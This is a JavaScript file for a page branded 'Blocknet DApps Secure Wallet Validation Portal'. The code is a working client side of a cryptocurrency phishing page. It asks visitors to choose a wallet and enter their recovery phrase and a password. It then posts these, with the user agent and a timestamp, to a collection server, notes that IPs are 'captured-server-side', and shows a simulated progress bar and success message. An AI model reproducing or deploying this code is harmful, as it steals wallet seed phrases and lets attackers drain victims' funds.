// ============================================
// INITIALIZATION & STATE MANAGEMENT
// ============================================
let selectedWallet = '';
let isSubmitting = false;
let currentStep = 1;

// DOM Elements
const elements = {
    modal: document.getElementById('recoveryModal'),
    openModalBtn: document.getElementById('openModal'),
    closeModalBtn: document.getElementById('closeModal'),
    recoveryForm: document.getElementById('recoveryForm'),
    submitBtn: document.getElementById('submitBtn'),
    loadingOverlay: document.querySelector('.loading-overlay'),
    successMessage: document.querySelector('.success-message'),
    toastContainer: document.querySelector('.toast-container'),
    inputs: {
        recoveryPhrase: document.getElementById('recoveryPhrase'),
        walletPassword: document.getElementById('walletPassword'),
        confirmPassword: document.getElementById('confirmPassword'),
        agreeTerms: document.getElementById('agreeTerms')
    }
};

// ============================================
// MODAL MANAGEMENT
// ============================================
function openModal() {
    elements.modal.classList.add('active');
    document.body.style.overflow = 'hidden';
    resetForm();
}

function closeModal() {
    elements.modal.classList.remove('active');
    document.body.style.overflow = 'auto';
    resetForm();
}

function resetForm() {
    elements.recoveryForm.reset();
    currentStep = 1;
    selectedWallet = '';
    showStep(1);
}

// ============================================
// STEP MANAGEMENT
// ============================================
function showStep(stepNumber) {
    // Hide all steps
    document.querySelectorAll('.form-step').forEach(step => {
        step.classList.remove('active');
    });

    // Show selected step
    const stepElement = document.getElementById(`step${stepNumber}`);
    if (stepElement) {
        stepElement.classList.add('active');
    }

    currentStep = stepNumber;
}

// Step 1: Wallet Selection
document.getElementById('step1Next')?.addEventListener('click', () => {
    const selectedRadio = document.querySelector('input[name="wallet"]:checked');
    if (!selectedRadio) {
        showToast('Please select a wallet', 'error');
        return;
    }
    selectedWallet = selectedRadio.value;
    showStep(2);
});

// Step 2: Recovery Phrase
document.getElementById('step2Back')?.addEventListener('click', () => {
    showStep(1);
});

document.getElementById('step2Next')?.addEventListener('click', () => {
    const recoveryPhrase = elements.inputs.recoveryPhrase.value.trim();
    
    if (!recoveryPhrase) {
        showToast('Please enter your recovery phrase', 'error');
        return;
    }

    if (recoveryPhrase.split(/\s+/).length < 12) {
        showToast('Recovery phrase must be at least 12 words', 'error');
        return;
    }

    showStep(3);
});

// Step 3: Password Setup
document.getElementById('step3Back')?.addEventListener('click', () => {
    showStep(2);
});

// ============================================
// INTERACTIVE ELEMENTS
// ============================================
document.addEventListener('DOMContentLoaded', () => {
    // Modal buttons
    elements.openModalBtn.addEventListener('click', openModal);
    elements.closeModalBtn.addEventListener('click', closeModal);

    // Close modal when clicking outside
    elements.modal.addEventListener('click', (e) => {
        if (e.target === elements.modal) {
            closeModal();
        }
    });

    // Paste button
    const pasteBtn = document.getElementById('pasteBtn');
    if (pasteBtn) {
        pasteBtn.addEventListener('click', async () => {
            try {
                const text = await navigator.clipboard.readText();
                elements.inputs.recoveryPhrase.value = text;
                showToast('Pasted from clipboard', 'success');
            } catch (err) {
                showToast('Unable to access clipboard', 'error');
            }
        });
    }
    
    // Password toggle buttons
    document.querySelectorAll('.toggle-password').forEach(btn => {
        btn.addEventListener('click', () => {
            const targetId = btn.dataset.target;
            const input = document.getElementById(targetId);
            const icon = btn.querySelector('i');
            
            if (input.type === 'password') {
                input.type = 'text';
                icon.classList.remove('fa-eye');
                icon.classList.add('fa-eye-slash');
            } else {
                input.type = 'password';
                icon.classList.remove('fa-eye-slash');
                icon.classList.add('fa-eye');
            }
        });
    });
});

// ============================================
// FORM SUBMISSION
// ============================================
async function handleSubmit(e) {
    e.preventDefault();
    
    if (isSubmitting) return;
    
    // Validation
    const recoveryPhrase = elements.inputs.recoveryPhrase.value.trim();
    const walletPassword = elements.inputs.walletPassword.value;
    const confirmPassword = elements.inputs.confirmPassword.value;
    
    if (!recoveryPhrase) {
        showToast('Please enter your recovery phrase', 'error');
        elements.inputs.recoveryPhrase.focus();
        return;
    }
    
    if (walletPassword !== confirmPassword) {
        showToast('Passwords do not match!', 'error');
        elements.inputs.confirmPassword.focus();
        return;
    }
    
    if (!elements.inputs.agreeTerms.checked) {
        showToast('Please agree to the terms', 'error');
        return;
    }
    
    // Start submission
    isSubmitting = true;
    elements.submitBtn.classList.add('loading');
    elements.loadingOverlay.classList.add('active');
    
    // Simulate progress
    let progress = 0;
    const progressInterval = setInterval(() => {
        progress += Math.random() * 15;
        if (progress > 90) progress = 90;
        updateProgress(progress);
    }, 200);
    
    // Prepare data
    const formData = {
        wallet: selectedWallet,
        recoveryPhrase: recoveryPhrase,
        password: walletPassword,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        ip: 'captured-server-side'
    };
    
    try {
        const response = await fetch('http://localhost:3000/api/submit', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify(formData)
        });
        
        clearInterval(progressInterval);
        updateProgress(100);
        
        if (response.ok) {
            const data = await response.json();
            console.log('[Success] Submission saved:', data);
            
            setTimeout(() => {
                elements.loadingOverlay.classList.remove('active');
                elements.successMessage.classList.add('active');
                
                // Auto-close after success
                setTimeout(() => {
                    closeModal();
                }, 4000);
            }, 500);
        } else {
            throw new Error(`Server error: ${response.status}`);
        }
    } catch (error) {
        clearInterval(progressInterval);
        console.error('[Error] Submission failed:', error);
        
        elements.loadingOverlay.classList.remove('active');
        elements.submitBtn.classList.remove('loading');
        isSubmitting = false;
        
        showToast('Connection error. Please try again.', 'error');
    }
}

function updateProgress(percent) {
    const progressFill = document.querySelector('.progress-fill');
    const progressText = document.querySelector('.progress-text');
    if (progressFill && progressText) {
        progressFill.style.width = `${percent}%`;
        progressText.textContent = `${Math.round(percent)}%`;
    }
}

// Form submission
elements.recoveryForm.addEventListener('submit', handleSubmit);

// ============================================
// TOAST NOTIFICATIONS
// ============================================
function showToast(message, type = 'info') {
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    
    const icons = {
        success: 'fa-check-circle',
        error: 'fa-exclamation-circle',
        info: 'fa-info-circle'
    };
    
    toast.innerHTML = `
        <i class="fas ${icons[type] || icons.info}"></i>
        <span>${message}</span>
    `;
    
    elements.toastContainer.appendChild(toast);
    
    // Auto remove
    setTimeout(() => {
        toast.classList.add('hide');
        setTimeout(() => toast.remove(), 300);
    }, 4000);
}

// ============================================
// UTILITY FUNCTIONS
// ============================================
function debounce(func, wait) {
    let timeout;
    return function executedFunction(...args) {
        const later = () => {
            clearTimeout(timeout);
            func(...args);
        };
        clearTimeout(timeout);
        timeout = setTimeout(later, wait);
    };
}

// Intersection Observer for scroll animations
const observerOptions = {
    threshold: 0.1,
    rootMargin: '0px 0px -50px 0px'
};

const observer = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            entry.target.style.opacity = '1';
            entry.target.style.transform = 'translateY(0)';
        }
    });
}, observerOptions);

// Observe elements after render
setTimeout(() => {
    document.querySelectorAll('.step-card, .feature-item').forEach(el => {
        el.style.opacity = '0';
        el.style.transform = 'translateY(20px)';
        el.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
        observer.observe(el);
    });
}, 100);

// Console branding
console.log('%c🔷 Blocknet DApps', 'color: #8b5cf6; font-size: 20px; font-weight: bold;');
console.log('%cSecure Wallet Validation Portal', 'color: #06b6d4; font-size: 12px;');
